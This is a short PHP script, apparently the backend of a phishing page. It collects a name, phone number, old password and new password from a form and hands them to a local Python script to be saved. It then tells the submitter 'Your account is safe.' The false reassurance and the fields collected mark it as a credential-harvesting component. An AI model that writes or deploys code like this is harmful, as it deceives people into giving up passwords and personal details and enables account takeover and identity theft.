<?php
// by YassineDouadi(CipherX)
$name = htmlspecialchars($_POST['name']);
$phone = htmlspecialchars($_POST['phone']);
$oldPassword = htmlspecialchars($_POST['old_password']);
$newPassword = htmlspecialchars($_POST['new_password']);

// Prepare data to send to the Python script
$command = escapeshellcmd("python3 save_info.py " . escapeshellarg($name) . " " . escapeshellarg($phone) . " " . escapeshellarg($oldPassword) . " " . escapeshellarg($newPassword));
$output = shell_exec($command);

echo "Your account is safe.";
?>
